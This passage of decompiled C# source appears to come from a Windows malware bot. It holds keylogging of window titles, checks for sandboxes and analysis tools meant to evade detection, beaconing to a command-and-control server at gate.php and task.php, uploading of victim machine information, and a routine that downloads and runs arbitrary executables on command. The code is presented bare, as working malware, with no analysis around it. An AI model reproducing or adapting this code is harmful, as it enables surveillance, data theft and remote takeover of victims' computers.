        MyProject.Computer.FileSystem.DeleteFile(Functions.path_screenshot2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private string GetCaption()
    {
      StringBuilder lpString = new StringBuilder(256);
      Form1.GetWindowText(Form1.GetForegroundWindow(), lpString, lpString.Capacity);
      return lpString.ToString();
    }

    private void Timer5_Tick(object sender, EventArgs e)
    {
      string caption = this.GetCaption();
      if (Operators.CompareString(this.makel, caption, false) == 0)
        return;
      this.makel = caption;
      this.Timer5.Stop();
      this.keylog_txt.AppendText("\r\n[ " + caption + " - " + DateAndTime.Now.ToString() + " ]\r\n");
      this.Timer5.Start();
    }

    public bool CheckIfSandboxed()
    {
      bool flag1 = Sandboxed.IsRunning("vpcmap", "vmsrvc", "vmusrvc");
      bool flag2 = Sandboxed.IsRunning("VBoxService");
      bool flag3 = Sandboxed.IsRunning("wireshark.exe");
      bool flag4 = Sandboxed.IsModuleLoaded("sbiedll.dll");
      Sandboxed.IsModuleLoaded("dbghelp.dll");
      object objectValue1 = RuntimeHelpers.GetObjectValue(Sandboxed.IsSandbox("76487-337-8429955-22614"));
      object objectValue2 = RuntimeHelpers.GetObjectValue(Sandboxed.IsSandbox("55274-640-2673064-23950"));
      object objectValue3 = RuntimeHelpers.GetObjectValue(Sandboxed.IsSandbox("76487-644-3177037-23510"));
      bool flag5 = Sandboxed.IsRunning("NETSTAT", "FILEMON", "PROCMON", "REGMON", "CAIN", "NETMON", "TCPVIEW", "ProcessHacker", "HTTPNetworkSniffer");
      return Conversions.ToBoolean(Conversions.ToBoolean((object) (flag2 || flag1 || (flag3 || flag4))) || Conversions.ToBoolean(objectValue1) || (Conversions.ToBoolean(objectValue2) || Conversions.ToBoolean(objectValue3)) || Conversions.ToBoolean((object) flag5) ? (object) true : (object) false);
    }

    public string Send_request_to_c2(object api_link)
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(new Uri(Conversions.ToString(api_link)));
      httpWebRequest.Method = "GET";
      HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
      string end = new StreamReader(response.GetResponseStream()).ReadToEnd();
      response.Close();
      return end;
    }

    public void upload_info()
    {
      try
      {
        string str = "/info.php?hwid=" + info.HWID();
        using (WebClient webClient = new WebClient())
          this.Fileuri2 = Encoding.ASCII.GetString(webClient.UploadFile(this.urlbot + str, this.info_pc));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void contact_c2()
    {
      try
      {
        Functions.Send_GET(this.urlbot + ("/gate.php?hwid=" + info.HWID()));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer6_Tick(object sender, EventArgs e)
    {
      this.txt_tasks.Text = this.Send_request_to_c2((object) (this.urlbot + "/task.php?hwid=" + info.HWID()));
      if (Operators.CompareString(this.txt_tasks.Text, (string) null, false) == 0)
        return;
      this.Timer6.Stop();
      this.DownloadAndRun(this.txt_tasks.Text);
      this.txt_tasks.Clear();
      Functions.Send_GET(this.urlbot + "/task.php?hwid=" + info.HWID() + "&completed=1");
      this.Timer6.Start();
    }

    private void DownloadAndRun(string exeUrl)
    {
      using (WebClient webClient = new WebClient())
      {
        byte[] bytes = webClient.DownloadData(exeUrl);
        string str = Path.GetTempFileName() + ".exe";
        System.IO.File.WriteAllBytes(str, bytes);
        Process.Start(str);
      }
    }
  }
}
